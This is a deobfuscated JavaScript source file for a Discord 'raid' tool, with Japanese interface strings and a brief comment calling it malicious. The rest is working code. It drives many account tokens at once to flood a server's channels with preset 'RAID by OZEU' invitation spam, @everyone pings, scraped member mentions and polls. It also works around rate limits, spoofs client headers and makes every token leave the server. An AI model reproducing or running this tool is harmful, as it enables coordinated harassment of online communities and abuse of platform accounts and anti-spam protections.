// Discord Raid Tool - Deobfuscated Code
// WARNING: This appears to be malicious software designed for Discord spam/raiding

// DOM element references
const logEl = document.getElementById('log');
const tokensInput = document.getElementById('tokens');
const guildInput = document.getElementById('guildId');
const channelInput = document.getElementById('channelIds');
const randomizeCheckbox = document.getElementById('randomize');
const allmentionCheckbox = document.getElementById('allmention');
const delayInput = document.getElementById('delay');
const limitInput = document.getElementById('limit');
const mentionInput = document.getElementById('mentionIds');
const pollTitleInput = document.getElementById('pollTitle');
const pollAnswersInput = document.getElementById('pollAnswers');
const autoFillBtn = document.getElementById('autoFillChannels');
const fetchMentionsBtn = document.getElementById('fetchMentions');
const submitBtn = document.getElementById('submitBtn');
const stopBtn = document.getElementById('stopSpam');
const leaveBtn = document.getElementById('leaveBtn');
const form = document.getElementById('form');

// Discord API properties for requests
const x_super_properties = 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiaGFzX2NsaWVudF9tb2RzIjpmYWxzZSwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW9acLxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTM0LjAuMC4wIFNhZmFyaS81MzcuMzYiLCJicm93c2VyX3ZlcnNpb24iOiIxMzQuMC4wLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6Imh0dHBzOi8vZGlzY29yZC5jb20iLCJyZWZlcnJpbmdfZG9tYWluIjoiZGlzY29yZC5jb20iLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6Mzg0ODg3LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==';

// Global spam control flag
let shouldStopSpam = false;

// Utility functions
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function appendLog(message) {
    const timestamp = new Date().toLocaleTimeString();
    logEl.textContent += '\n' + timestamp + ' | ' + message;
    logEl.scrollTop = logEl.scrollHeight;
}

function clearLog() {
    logEl.textContent = '';
}

function parseList(input) {
    const items = input.split(/[\s,]+/).map(item => item.trim()).filter(item => item);
    return [...new Set(items)];
}

// Discord API functions
async function leaveGuild(token, guildId) {
    const response = await fetch(`https://discord.com/api/v9/users/@me/guilds/${guildId}`, {
        method: 'DELETE',
        headers: {
            'Authorization': token,
            'Content-Type': 'application/json',
            'x-super-properties': x_super_properties
        },
        body: JSON.stringify({ 'lurking': false }),
        referrerPolicy: 'no-referrer'
    });

    if (response.status === 204) {
        appendLog('✅ 退出成功: ' + token.slice(0, 10) + '*****');
    } else {
        appendLog('❌ ' + token.slice(0, 10) + '*****' + ' - 退出失敗(' + JSON.stringify(await response.json()) + ')');
    }
}

async function authenticateOnly(token) {
    return new Promise(resolve => {
        const ws = new WebSocket('wss://gateway.discord.gg/?v=9&encoding=json');
        
        ws.onopen = () => {
            ws.send(JSON.stringify({
                'op': 2,
                'd': {
                    'token': token,
                    'properties': {
                        'os': 'Windows',
                        'browser': 'Discord',
                        'device': 'pc'
                    },
                    'intents': 0
                }
            }));
        };
        
        ws.onmessage = event => {
            const data = JSON.parse(event.data);
            if (data.t === 'READY') {
                appendLog('✅ 認証完了: ' + token.slice(0, 10) + '*****');
                ws.close();
                resolve(true);
            } else if (data.t === 'INVALID_SESSION') {
                appendLog('❌ 認証失敗: ' + token.slice(0, 10) + '*****');
                ws.close();
                resolve(false);
            }
        };
        
        ws.onerror = () => {
            appendLog('❌ WebSocket エラー: ' + token.slice(0, 10) + '*****');
            ws.close();
            resolve(false);
        };
        
        ws.onclose = () => {
            resolve(false);
        };
    });
}

async function sendMessage(token, channelId, content, options = {}) {
    const headers = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'x-super-properties': x_super_properties
    };

    let messageData = {
        'content': content || ''
    };

    // Add random UUID if randomize is enabled
    if (options.randomize) {
        messageData.content += '\n' + crypto.randomUUID();
    }

    // Add @everyone mention if allmention is enabled
    if (options.allmention) {
        messageData.content = '@everyone\n' + messageData.content;
    }

    // Add random mention if randomMentions is provided
    if (options.randomMentions) {
        const randomMention = options.randomMentions[Math.floor(Math.random() * options.randomMentions.length)];
        messageData.content = '<@' + randomMention + '>\n' + messageData.content;
    }

    // Add poll data if provided
    if (options.pollTitle && options.pollAnswers) {
        messageData.poll = {
            'question': { 'text': options.pollTitle },
            'answers': options.pollAnswers.map(answer => ({
                'poll_media': { 'text': answer.trim() }
            })),
            'allow_multiselect': false,
            'duration': 1,
            'layout_type': 1
        };
    }

    const response = await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
        method: 'POST',
        headers: headers,
        body: JSON.stringify(messageData),
        referrerPolicy: 'no-referrer'
    });

    return response;
}

async function sendMessageWithRetry(token, channelId, content, options = {}, maxRetries = 5, retryDelay = 3000) {
    let attempts = 0;
    
    while (attempts < maxRetries) {
        try {
            const response = await sendMessage(token, channelId, content, options);
            
            if (response.ok) {
                appendLog('✅ ' + token.slice(0, 10) + '*****' + ' - メッセージ送信成功');
                return true;
            } else if (response.status === 429) {
                // Rate limit handling
                const rateLimitData = await response.json();
                const waitTime = (rateLimitData?.retry_after || 1) * 1000;
                appendLog('*****' + ' - レート制限: ' + token.slice(0, 10) + '*****' + ' - ' + waitTime / 1000 + 's');
                await sleep(waitTime);
                attempts++;
            } else if (response.status === 400) {
                const errorData = await response.json();
                appendLog('❌ ' + token.slice(0, 10) + '*****' + ' - 送信エラー(' + response.status + '):' + (JSON.stringify(errorData) || '詳細不明'));
                
                // Re-authenticate token
                const authTest = await authenticateOnly(token);
                if (!authTest) return false;
            } else {
                const errorData = await response.json();
                appendLog('❌ ' + token.slice(0, 10) + '*****' + ' - 送信エラー(' + response.status + '):' + (JSON.stringify(errorData) || '詳細不明'));
                return false;
            }
        } catch (error) {
            appendLog('*****' + ' - エラー: ' + token.slice(0, 10) + '*****' + ' - エラー: ' + error.message + ' | 再試行中...');
            await sleep(retryDelay);
            attempts++;
        }
    }
    
    appendLog('❌ トークン(' + token.slice(0, 10) + '*****' + ') 最大リトライ回数に達しました。');
    return false;
}

function checkFormValidity() {
    const tokens = tokensInput.value.trim();
    const guildId = guildInput.value.trim();
    submitBtn.disabled = !(tokens && guildId);
}

// Event listeners
tokensInput.addEventListener('input', checkFormValidity);
guildInput.addEventListener('input', checkFormValidity);
checkFormValidity();

// Auto-fill channels button
autoFillBtn.addEventListener('click', async () => {
    clearLog();
    const tokens = parseList(tokensInput.value);
    const guildId = guildInput.value.trim();
    
    if (!tokens.length) return appendLog('⚠️ トークンを入力してください');
    if (!guildId) return appendLog('⚠️ サーバーIDを入力してください');
    
    try {
        const response = await fetch(`https://discord.com/api/v9/guilds/${guildId}/channels`, {
            headers: {
                'Authorization': tokens[0],
                'Content-Type': 'application/json',
                'x-super-properties': x_super_properties
            },
            referrerPolicy: 'no-referrer'
        });
        
        if (!response.ok) throw new Error(JSON.stringify(await response.json()));
        
        const channels = await response.json();
        const textChannels = channels.filter(channel => channel.type === 0).map(channel => channel.id);
        
        if (!textChannels.length) return appendLog('チャンネルが見つかりません');
        
        channelInput.value = textChannels.join(',');
        appendLog('✅ チャンネル取得完了');
    } catch (error) {
        appendLog('❌ ' + token.slice(0, 10) + '*****' + ' - エラー：' + error.message);
    }
});

// Fetch mentions button
fetchMentionsBtn.addEventListener('click', async () => {
    clearLog();
    const tokens = parseList(tokensInput.value);
    const guildId = guildInput.value.trim();
    const channels = parseList(channelInput.value);
    
    if (!tokens.length) return appendLog('⚠️ トークンを入力してください');
    if (!guildId) return appendLog('⚠️ サーバーIDを入力してください');
    if (!channels.length) return appendLog('⚠️ チャンネルIDを入力してください');
    
    const ws = new WebSocket('wss://gateway.discord.gg/?v=9&encoding=json');
    
    ws.onopen = () => {
        ws.send(JSON.stringify({
            'op': 2,
            'd': {
                'token': tokens[0],
                'properties': {
                    'os': 'Windows',
                    'browser': 'Discord',
                    'device': 'pc'
                },
                'intents': 1 << 12
            }
        }));
    };
    
    ws.onmessage = event => {
        const data = JSON.parse(event.data);
        
        if (data.op === 0 && data.t === 'READY') {
            ws.send(JSON.stringify({
                'op': 14,
                'd': {
                    'guild_id': guildId,
                    'typing': false,
                    'activities': false,
                    'threads': true,
                    'channels': {
                        [channels[0]]: [[0, 0]]
                    }
                }
            }));
        }
        
        if (data.t === 'GUILD_MEMBER_LIST_UPDATE') {
            const memberIds = data.d.ops[0].items.filter(item => item.member).map(item => item.member.user.id);
            
            if (memberIds.length) {
                mentionInput.value = memberIds.join(',');
                appendLog('✅ メンション取得完了');
            } else {
                appendLog('メンションが見つかりません');
            }
            ws.close();
        }
    };
    
    ws.onerror = () => {
        appendLog('❌ WebSocketエラー');
        ws.close();
    };
});

// Main form submission
form.addEventListener('submit', async event => {
    event.preventDefault();
    
    const messageOption = document.querySelector('input[name="messageOption"]:checked');
    let message;
    
    // Predefined spam messages (URLs appear to be disguised/malicious)
    if (messageOption.value === 'A') {
        message = '#\u0020RAID\u0020by\u0020OZEU.\u0020join\u0020now\n#\u0020ozeu\u0020on\u0020top\nhttps://discord.gg/oze';
    } else if (messageOption.value === 'B') {
        message = '# おぜうの集いに今すぐ参加！\n## https://discord.gg/oze\u0020https://media.discordapp.net/attachments/1417174440940146861/1419596195072053369/kuragif_1.gif?ex=68d2557b&is=68d103fb&hm=a36bf9805c401cbad23dfd134aa11daa933db3ca5e3fcb386766276aead5e072&=&width=375&height=281';
    } else if (messageOption.value === 'C') {
        message = '# おぜつどに速やかに参戦！\u0020https://x.gd/GDUwv\u0020https://x.gd/YjwDu\u0020https://media.discordapp.net/attachments/1417174440940146861/1419596195072053369/kuragif_1.gif?ex=68d2557b&is=68d103fb&hm=a36bf9805c401cbad23dfd134aa11daa933db3ca5e3fcb386766276aead5e072&=&width=375&height=281';
    }
    
    if (!message) {
        appendLog('⚠️ メッセージ内容が入力されていません');
        return;
    }
    
    // Disable submit button and show loading state
    submitBtn.disabled = true;
    submitBtn.classList.add('loading');
    submitBtn.textContent = '実行中...';
    shouldStopSpam = false;
    stopBtn.disabled = false;
    
    // Parse form inputs
    const tokens = parseList(tokensInput.value);
    const guildId = guildInput.value.trim();
    const channels = parseList(channelInput.value);
    const randomize = randomizeCheckbox.checked;
    const allmention = allmentionCheckbox.checked;
    const delay = parseFloat(delayInput.value) || 0;
    const limit = limitInput.value.trim() ? parseInt(limitInput.value) : Infinity;
    const mentions = mentionInput.value.trim() ? parseList(mentionInput.value) : null;
    const pollTitle = pollTitleInput.value.trim() || null;
    const pollAnswers = pollAnswersInput.value.trim() ? parseList(pollAnswersInput.value) : null;
    
    let messageCount = 0;
    
    // Create spam functions for each token
    const spamFunctions = tokens.map(token => {
        return async () => {
            let channelIndex = 0;
            while (!shouldStopSpam && messageCount < limit) {
                if (channelIndex >= channels.length) channelIndex = 0;
                
                const channelId = channels[channelIndex];
                channelIndex++;
                
                const success = await sendMessageWithRetry(token, channelId, message, {
                    'randomize': randomize,
                    'randomMentions': mentions,
                    'pollTitle': pollTitle,
                    'pollAnswers': pollAnswers,
                    'allmention': allmention
                });
                
                if (success) messageCount++;
                
                if (messageCount >= limit) {
                    appendLog('✅ 指定数に達しました');
                    break;
                }
                
                if (delay) await sleep(delay * 1000);
            }
        };
    });
    
    // Execute all spam functions concurrently
    await Promise.all(spamFunctions.map(func => func()));
    
    // Reset UI state
    submitBtn.disabled = false;
    submitBtn.classList.remove('loading');
    stopBtn.disabled = true;
    submitBtn.textContent = '実行';
    appendLog('✅ 完了');
});

// Stop spam button
stopBtn.addEventListener('click', () => {
    shouldStopSpam = true;
    appendLog('🛑 スパムを停止します...');
    submitBtn.disabled = false;
    submitBtn.classList.remove('loading');
    submitBtn.textContent = '実行';
});

// Leave guild button
leaveBtn.addEventListener('click', async () => {
    shouldStopSpam = true;
    stopBtn.disabled = true;
    appendLog('🛑 スパムを停止します...');
    
    const tokens = parseList(tokensInput.value);
    const guildId = guildInput.value.trim();
    
    if (!tokens.length) return appendLog('⚠️ トークンを入力してください');
    if (!guildId) return appendLog('⚠️ サーバーIDを入力してください');
    
    // Leave guild for each token
    for (const token of tokens) {
        await leaveGuild(token, guildId);
    }
    
    appendLog('✅ 退出処理完了');
    submitBtn.disabled = false;
    submitBtn.classList.remove('loading');
    submitBtn.textContent = '実行';
});
